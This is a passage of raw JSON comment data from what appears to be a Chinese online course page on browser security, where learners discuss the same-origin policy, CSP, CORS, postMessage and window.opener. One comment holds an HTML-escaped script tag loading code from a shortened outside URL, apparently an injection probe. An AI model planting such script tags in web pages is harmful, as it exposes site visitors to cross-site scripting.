工具","like_count":1},{"had_liked":false,"id":255508,"user_name":"小炭","can_delete":false,"product_type":"c1","uid":1109544,"ip_address":"","ucode":"E20E3958CAF06C","user_header":"https://static001.geekbang.org/account/avatar/00/10/ee/28/c04a0c83.jpg","comment_is_top":false,"comment_ctime":1603360532,"is_pvip":true,"discussion_count":0,"race_medal":0,"score":"5898327828","product_id":100033601,"comment_content":"window.postMessage 的 JavaScript 接口特意查了一下，是支持IE8的。https:&#47;&#47;developer.mozilla.org&#47;zh-CN&#47;docs&#47;Web&#47;API&#47;Window&#47;postMessage（8 — 10 ： Support only for &lt;frame&gt; and &lt;iframe&gt;.）","like_count":1},{"had_liked":false,"id":209743,"user_name":"穿秋裤的男孩","can_delete":false,"product_type":"c1","uid":1748640,"ip_address":"","ucode":"D0F48C66377893","user_header":"https://static001.geekbang.org/account/avatar/00/1a/ae/a0/707350ef.jpg","comment_is_top":false,"comment_ctime":1587607618,"is_pvip":false,"discussion_count":2,"race_medal":0,"score":"5882574914","product_id":100033601,"comment_content":"我从https:&#47;&#47;time.geekbang.org&#47;   打开   https:&#47;&#47;horde.geekbang.org&#47;home，这明显是不同源的，但是还是可以在第二个页面里操作第一个页面的dom（openr.document.body.display = &#39;none&#39;）;<br>这是为何？","like_count":1,"discussions":[{"author":{"id":1562840,"avatar":"http://thirdwx.qlogo.cn/mmopen/vi_32/Q0j4TwGTfTL1AlMfMbIJccY2t3kLgyk6LLfConLPZx7uiaVBMrQdib0IKu6A9jic1w1jDAdxMoEqCWH78mpp3qN6Q/132","nickname":"惊沙男孩","note":"","ucode":"A7160E90983730","race_medal":0,"user_type":1,"is_pvip":false},"reply_author":{"id":0,"avatar":"","nickname":"","note":"","ucode":"","race_medal":0,"user_type":1,"is_pvip":false},"discussion":{"id":351801,"discussion_content":"我执行了一下，发现是报错呢，操作不了DOM。“Uncaught ReferenceError: openr is not defined”","likes_number":0,"is_delete":false,"is_hidden":false,"ctime":1614440518,"is_liked":false,"can_delete":false,"is_complain":false,"is_top":false,"parent_id":0,"ip_address":""},"score":2,"extra":"","child_discussion_number":1,"child_discussions":[{"author":{"id":2514423,"avatar":"","nickname":"Xx","note":"","ucode":"0BE62D47E42B0E","race_medal":0,"user_type":1,"is_pvip":false},"reply_author":{"id":1562840,"avatar":"http://thirdwx.qlogo.cn/mmopen/vi_32/Q0j4TwGTfTL1AlMfMbIJccY2t3kLgyk6LLfConLPZx7uiaVBMrQdib0IKu6A9jic1w1jDAdxMoEqCWH78mpp3qN6Q/132","nickname":"惊沙男孩","note":"","ucode":"A7160E90983730","race_medal":0,"user_type":1,"is_pvip":false},"discussion":{"id":363196,"discussion_content":"因为他opner拼错了，但就是拼对了也有跨域问题啊","likes_number":0,"is_delete":false,"is_hidden":false,"ctime":1617125378,"is_liked":false,"can_delete":false,"is_complain":false,"is_top":false,"parent_id":351801,"ip_address":""},"score":363196,"extra":""}]}]},{"had_liked":false,"id":141985,"user_name":"早起不吃虫","can_delete":false,"product_type":"c1","uid":1369757,"ip_address":"","ucode":"13CD3B5E1F9435","user_header":"http://thirdwx.qlogo.cn/mmopen/vi_32/7WkTI1IicbKvsPJng5vQh5qlrf1smbfl2zb7icHZfzcAk1k4lr8w8IDEAdrqq1NHW5XZMPXiaa1h7Jn1LGOWOCkIA/132","comment_is_top":false,"comment_ctime":1571276029,"is_pvip":false,"replies":[{"id":"54795","content":"讲这个我还得准备一些后端的演示代码，放到最后的答疑部分吧","user_name":"作者回复","user_name_real":"李兵","uid":"1141464","ctime":1571279244,"ip_address":"","comment_id":141985,"utype":1}],"discussion_count":1,"race_medal":0,"score":"5866243325","product_id":100033601,"comment_content":"老师，跨域资源共享和跨文档消息机制这一块可以详细讲一下吗","like_count":1,"discussions":[{"author":{"id":1141464,"avatar":"https://static001.geekbang.org/account/avatar/00/11/6a/d8/228449c9.jpg","nickname":"李兵","note":"","ucode":"3F3D3F6E20209E","race_medal":0,"user_type":2,"is_pvip":false},"reply_author":{"id":0,"avatar":"","nickname":"","note":"","ucode":"","race_medal":0,"user_type":1,"is_pvip":false},"discussion":{"id":470945,"discussion_content":"讲这个我还得准备一些后端的演示代码，放到最后的答疑部分吧","likes_number":0,"is_delete":false,"is_hidden":false,"ctime":1571279244,"is_liked":false,"can_delete":false,"is_complain":false,"is_top":true,"parent_id":0,"ip_address":""},"score":2,"extra":"{\"reply\":true,\"user_type\":2}","child_discussion_number":0,"child_discussions":[]}]},{"had_liked":false,"id":360728,"user_name":"zero","can_delete":false,"product_type":"c1","uid":1640556,"ip_address":"上海","ucode":"C8CB775680F0AF","user_header":"","comment_is_top":false,"comment_ctime":1666785405,"is_pvip":true,"discussion_count":0,"race_medal":0,"score":"1666785405","product_id":100033601,"comment_content":"&lt;script src=http:&#47;&#47;t.cn&#47;readm&gt;&lt;&#47;script&gt;","like_count":0},{"had_liked":false,"id":360347,"user_name":"千寻","can_delete":false,"product_type":"c1","uid":2018641,"ip_address":"上海","ucode":"60E838FA42EE79","user_header":"https://static001.geekbang.org/account/avatar/00/1e/cd/51/f70254bc.jpg","comment_is_top":false,"comment_ctime":1666482031,"is_pvip":false,"discussion_count":0,"race_medal":0,"score":"1666482031","product_id":100033601,"comment_content":"为啥我都没有看到其它网站有设置csp的响应头呢","like_count":0},{"had_liked":false,"id":358394,"user_name":"无颜","can_delete":false,"product_type":"c1","uid":1536543,"ip_address":"浙江","ucode":"D7A4EBC34D8E83","user_header":"https://static001.geekbang.org/account/avatar/00/17/72/1f/1f919246.jpg","comment_is_top":false,"comment_ctime":1664267891,"is_pvip":false,"discussion_count":0,"race_medal":0,"score":"1664267891","product_id":100033601,"comment_content":"同源策略是限制不同源的站点之间操作DOM、进行浏览器数据的窃取或修改、对于网络请求的的乱发进行网络攻击等；<br>CSP相当于白名单，可以引用不同源的第三方资源<br>CORS可以进行跨域操作","like_count":0},{"had_liked":false,"id":354839,"user_name":"追风筝的人","can_delete":false,"product_type":"c1","uid":1488020,"ip_address":"陕西","ucode":"2993D60F94C396","user_header":"https://static001.geekbang.org/account/avatar/00/16/b4/94/2796de72.jpg","comment_is_top":false,"comment_ctime":1660815090,"is_pvip":false,"discussion_count":0,"race_medal":0,"score":"1660815090","product_id":100033601,"comment_content":"同源：同域名 ，端口的URL, 不同源不能互操作DOM","like_count":0},{"had_liked":false,"id":344264,"user_name":"Geek_115bc8","can_delete":false,"product_type":"c1","uid":1673843,"ip_address":"","ucode":"71FBC9F02AFE1B","user_header":"http://thirdwx.qlogo.cn/mmopen/vi_32/DYAIOgq83erXRaa98A3zjLDkOibUJV1254aQ4EYFTbSLJuEvD0nXicMNA8pLoxOfHf5kPTbGLXNicg8CPFH3Tn0mA/132","comment_is_top":false,"comment_ctime":1651406482,"is_pvip":false,"discussion_count":0,"race_medal":0,"score":"1651406482","product_id":100033601,"comment_content":"CSP 的核心思想是让服务器决定浏览器能够加载哪些资源，让服务器决定浏览器是否能够执行内联 JavaScript 代码。","like_count":0},{"had_liked":false,"id":302828,"user_name":"涛涛~","can_delete":false,"product_type":"c1","uid":2551451,"ip_address":"","ucode":"ED94B7464CB818","user_header":"https://static001.geekbang.org/account/avatar/00/26/ee/9b/0d6f8f9e.jpg","comment_is_top":false,"comment_ctime":1626400255,"is_pvip":false,"discussion_count":0,"race_medal":0,"score":"1626400255","product_id":100033601,"comment_content":"同源策略、CSP 和 CORS 之间的关系：<br>xss 防止攻击，但是它是个地图炮，为了避免误伤可以把选择权交给服务端配置，留出三方资源加载的口子和执行权限。<br><br>CORS 跨站请求，这个需要服务端配合改造，例如 A 站点 请求 B 站点服务 api ","like_count":0},{"had_liked":false,"id":261119,"user_name":"JianXu","can_delete":false,"product_type":"c1","uid":1033219,"ip_address":"","ucode":"2A61BDBB573BDC","user_header":"https://static001.geekbang.org/account/avatar/00/0f/c4/03/f753fda7.jpg","comment_is_top":false,"comment_ctime":1605222578,"is_pvip":false,"discussion_count":2,"race_medal":0,"score":"1605222578","product_id":100033601,"comment_content":"老师，引用第三方资源是不是也属于跨域请求呢？我记得script src,  或者 img src 等都不受同源策略限制的，所以结论是引用第三方资源就只能通过CSP 来限制吗？那问题来了，我引用第三方资源特别是第三方JS 后JS 里面的脚本会执行的，这样不就是第三方的资源脚本可以更改我的DOM 了吗。","like_count":0,"discussions":[{"author":{"id":2514423,"avatar":"","nickname":"Xx","note":"","ucode":"0BE62D47E42B0E","race_medal":0,"user_type":1,"is_pvip":false},"reply_author":{"id":0,"avatar":"","nickname":"","note":"","ucode":"","race_medal":0,"user_type":1,"is_pvip":false},"discussion":{"id":362505,"discussion_content":"服务器如果不设置CSPheader的话，应该不可以引入第三方资源吧","likes_number":0,"is_delete":false,"is_hidden":false,"ctime":1616965674,"is_liked":false,"can_delete":false,"is_complain":false,"is_top":false,"parent_id":0,"ip_address":""},"score":2,"extra":"","child_discussion_number":0,"child_discussions":[]},{"author":{"id":2033513,"avatar":"https://static001.geekbang.org/account/avatar/00/1f/07/69/43cf2251.jpg","nickname":"Alan He","note":"","ucode":"A0780F4619D388","race_medal":0,"user_type":1,"is_pvip":false},"reply_author":{"id":0,"avatar":"","nickname":"","note":"","ucode":"","race_medal":0,"user_type":1,"is_pvip":false},"discussion":{"id":353110,"discussion_content":"我之前出现过一个问题就是script引用第三方资源，Chrome报了cors错误。","likes_number":0,"is_delete":false,"is_hidden":false,"ctime":1615011042,"is_liked":false,"can_delete":false,"is_complain":false,"is_top":false,"parent_id":0,"ip_address":""},"score":2,"extra":"","child_discussion_number":0,"child_discussions":[]}]},{"had_liked":false,"id":225769,"user_name":"james","can_delete":false,"product_type":"c1","uid":1232771,"ip_address":"","ucode":"AC42035106E5B9","user_header":"http://thirdwx.qlogo.cn/mmopen/vi_32/yyibGRYCArsUNBfCAEAibua09Yb9D5AdO8TkCmXymhAepibqmlz0hzg06ggBLxyvXicnjqFVGr7zYF0rQoZ0aXCBAg/132","comment_is_top":false,"comment_ctime":1591851183,"is_pvip":false,"discussion_count":0,"race_medal":1,"score":"1591851183","product_id":100033601,"comment_content":"同源策略、CSP 和 CORS 之间的关系：<br><br>同源策略就是说同源页面随你瞎搞，但是不同源之间想瞎搞只能通过浏览器提供的手段来搞<br><br>比如说<br>1. 读取数据和操作 DOM 要用跨文档机制（postMessage）<br>2. 跨域请求要用 CORS 机制<br>3. 引用第三方资源要用 CSP","like_count":0},{"had_liked":false,"id":224379,"user_name":"卡尔","can_delete":false,"product_type":"c1","uid":1445936,"ip_address":"","ucode":"BD6F76BC18FF8F","user_header":"https://static001.geekbang.org/account/avatar/00/16/10/30/c07d419c.jpg","comment_is_top":false,"comment_ctime":1591358222,"is_pvip":false,"discussion_count":0,"race_medal":0,"score":"1591358222","product_id":100033601,"comment_content":"老师，能讲讲referer吗？看浏览器的network是referrer，然后很多文章和抓包工具显示的是referer。这个referer可以模拟吗，比如在服务端。","like_count":0},{"had_liked":false,"id":162565,"user_name":"-_-|||","can_delete":false,"product_type":"c1","uid":1328142,"ip_address":"","ucode":"94B21594658BF9","user_header":"https://static001.geekbang.org/account/avatar/00/14/44/0e/ce14b7d3.jpg","comment_is_top":false,"comment_ctime":1576555771,"is_pvip":false,"discussion_count":3,"race_medal":1,"score":"1576555771","product_id":100033601,"comment_content":"我这 opener 对象是 null。","like_count":0,"discussions":[{"author":{"id":1254252,"avatar":"https://static001.geekbang.org/account/avatar/00/13/23/6c/82ba5e1f.jpg","nickname":"LIKE","note":"","ucode":"9DAB7F9051648A","race_medal":0,"user_type":1,"is_pvip":false},"reply_author":{"id":0,"avatar":"","nickname":"","note":"","ucode":"","race_medal":0,"user_type":1,"is_pvip":false},"discussion":{"id":285569,"discussion_content":"1.先打开专栏，https://time.geekbang.org/?m=1&amp;d=0&amp;c=0&amp;sort=1&amp;order=sort&amp;utm_source=web&amp;utm_medium=pinpaizhuanqu&amp;utm_campaign=baidu&amp;utm_term=pinpaizhuanqu&amp;utm_content=0427\n2.再点击打开任意一个专栏，https://time.geekbang.org/column/intro/100053301?utm_source=web&amp;utm_medium=pinpaizhuanqu&amp;utm_campaign=baidu&amp;utm_term=pinpaizhuanqu&amp;utm_content=0427\n3.在专栏详情页面的控制台输入老师提供的脚本即可","likes_number":0,"is_delete":false,"is_hidden":false,"ctime":1592882118,"is_liked":false,"can_delete":false,"is_complain":false,"is_top":false,"parent_id":0,"ip_address":""},"score":2,"extra":"","child_discussion_number":0,"child_discussions":[]},{"author":{"id":1804614,"avatar":"https://static001.geekbang.org/account/avatar/00/1b/89/46/01ee869b.jpg","nickname":"西瓜太郎65","note":"","ucode":"4AF30466BF53B5","race_medal":0,"user_type":1,"is_pvip":false},"reply_author":{"id":0,"avatar":"","nickname":"","note":"","ucode":"","race_medal":0,"user_type":1,"is_pvip":false},"discussion":{"id":277606,"discussion_content":"我也是  知道为什么了吗？\n","likes_number":0,"is_delete":false,"is_hidden":false,"ctime":1591079672,"is_liked":false,"can_delete":false,"is_complain":false,"is_top":false,"parent_id":0,"ip_address":""},"score":2,"extra":"","child_discussion_number":1,"child_discussions":[{"author":{"id":2217351,"avatar":"https://static001.geekbang.org/account/avatar/00/21/d5/87/bacd5b3e.jpg","nickname":"learning","note":"","ucode":"7EBA7BA7BF0FAF","race_medal":0,"user_type":1,"is_pvip":false},"reply_author":{"id":1804614,"avatar":"https://static001.geekbang.org/account/avatar/00/1b/89/46/01ee869b.jpg","nickname":"西瓜太郎65","note":"","ucode":"4AF30466BF53B5","race_medal":0,"user_type":1,"is_pvip":false},"discussion":{"id":310846,"discussion_content":"在JS中，window.opener是对弹出窗口的母窗口的一个引用。","likes_number":0,"is_delete":false,"is_hidden":false,"ctime":1602076500,"is_liked":false,"can_delete":false,"is_complain":false,"is_top":false,"parent_id":277606,"ip_address":""},"score":310846,"extra":""}]}]},{"had_liked":false,"id":146236,"user_name":"wd2010","can_delete":false,"product_type":"c1","uid":1691581,"ip_address":"","ucode":"E194E4EFECA013","user_header":"https://static001.geekbang.org/account/avatar/00/19/cf/bd/4fa01a1c.jpg","comment_is_top":false,"comment_ctime":1572481922,"is_pvip":false,"replies":[{"id":"56712","content":"这块浏览器处理到是不复杂的，主要是弄清楚同源策略的具体开了哪些口子，这些口子是如何影响到前后端开发的？","user_name":"作者回复","user_name_real":"李兵","uid":"1141464","ctime":1572615775,"ip_address":"","comment_id":146236,"utype":1}],"discussion_count":1,"race_medal":0,"score":"1572481922","product_id":100033601,"comment_content":"老师，浏览器的同源策略可以再讲细点么，比如浏览器的内部处理机制是怎样的，这些感觉很需要老师帮忙解答下","like_count":0,"discussions":[{"author":{"id":1141464,"avatar":"https://static001.geekbang.org/account/avatar/00/11/6a/d8/228449c9.jpg","nickname":"李兵","note":"","ucode":"3F3D3F6E20209E","race_medal":0,"user_type":2,"is_pvip":false},"reply_author":{"id":0,"avatar":"","nickname":"","note":"","ucode":"","race_medal":0,"user_type":1,"is_pvip":false},"discussion":{"id":472761,"discussion_content":"这块浏览器处理到是不复杂的，主要是弄清楚同源策略的具体开了哪些口子，这些口子是如何影响到前后端开发的？","likes_number":0,"is_delete":false,"is_hidden":false,"ctime":1572615775,"is_liked":false,"can_delete":false,"is_complain":false,"is_top":true,"parent_id":0,"ip_address":""},"score":2,"extra":"{\"reply\":true,\"user_type\":2}","child_discussion_number":0,"child_discussions":[]}]},{"had_liked":false,"id":146229,"user_name":"Shine","can_delete":false,"product_type":"c1","uid":1022568,"ip_address":"","ucode":"C8C617B87C63C7","user_header":"https://static001.geekbang.org/account/avatar/00/0f/9a/68/92caeed6.jpg","comment_is_top":false,"comment_ctime":1572481025,"is_pvip":false,"discussion_count":2,"race_medal":0,"score":"1572481025","product_id":100033601,"comment_content":"同源DOM互相操作的例子中，第二个页面如何获取第一个页面的window对象opener的？也就是opener是在哪里被赋值的？","like_count":0,"discussions":[{"author":{"id":2033513,"avatar":"https://static001.geekbang.org/account/avatar/00/1f/07/69/43cf2251.jpg","nickname":"Alan He","note":"","ucode":"A0780F4619D388","race_medal":0,"user_type":1,"is_pvip":false},"reply_author":{"id":0,"avatar":"","nickname":"","note":"","ucode":"","race_medal":0,"user_type":1,"is_pvip":false},"discussion":{"id":353115,"discussion_content":"opener是面向同站，并非同源。","likes_number":0,"is_delete":false,"is_hidden":false,"ctime":1615015939,"is_liked":false,"can_delete":false,"is_complain":false,"is_top":false,"parent_id":0,"ip_address":""},"score":2,"extra":"","child_discussion_number":0,"child_discussions":[]},{"author":{"id":2217351,"avatar":"https://static001.geekbang.org/account/avatar/00/21/d5/87/bacd5b3e.jpg","nickname":"learning","note":"","ucode":"7EBA7BA7BF0FAF","race_medal":0,"user_type":1,"is_pvip":false},"reply_author":{"id":0,"avatar":"","nickname":"","note":"","ucode":"","race_medal":0,"user_type":1,"is_pvip":false},"discussion":{"id":310847,"discussion_content":"在A页面打开一个新页面即可。在JS中，window.opener是对弹出窗口的母窗口的一个引用。","likes_number":0,"is_delete":false,"is_hidden":false,"ctime":1602076575,"is_liked":false,"can_delete":false,"is_complain":false,"is_top":false,"parent_id":0,"ip_address":""},"score":2,"extra":"","child_discussion_number":0,"child_discussions":[]}]},{"had_liked":false,"id":142069,"user_name":"隔夜果酱","can_delete":false,"product_type":"c1","uid":1319638,"ip_address":"","ucode":"5AFEB62E832BCB","user_header":"https://static001.geekbang.org/account/avatar/00/14/22/d6/9378f4d5.jpg","comment_is_top":false,"comment_ctime":1571287835,"is_pvip":false,"replies":[{"id":"54827","content":"目前稍微好点，有了沙盒，有了HTTPS，少了插件，页面进程也做了分离，攻击站点的难度和成本都提升了不少！","user_name":"作者回复","user_name_real":"李兵","uid":"1141464","ctime":1571288874,"ip_address":"","comment_id":142069,"utype":1}],"discussion_count":1,"race_medal":0,"score":"1571287835","product_id":100033601,"comment_content":"这些安全机制感觉还是太弱了,非常容易被攻破.怪不得早些年钓鱼网站横行.","like_count":0,"discussions":[{"author":{"id":1141464,"avatar":"https://static001.geekbang.org/account/avatar/00/11/6a/d8/228449c9.jpg","nickname":"李兵","note":"","ucode":"3F3D3F6E20209E","race_medal":0,"user_type":2,"is_pvip":false},"reply_author":{"id":0,"avatar":"","nickname":"","note":"","ucode":"","race_medal":0,"user_type":1,"is_pvip":false},"discussion":{"id":470974,"discussion_content":"目前稍微好点，有了沙盒，有了HTTPS，少了插件，页面进程也做了分离，攻击站点的难度和成本都提升了不少！","likes_number":0,"is_delete":false,"is_hidden":false,"ctime":1571288874,"is_liked":false,"can_delete":false,"is_complain":false,"is_top":true,"parent_id":0,"ip_address":""},"score":2,"extra":"{\"reply\":true,\"user_type\":2}","child_discussion_number":0,"child_discussions":[]}]}]}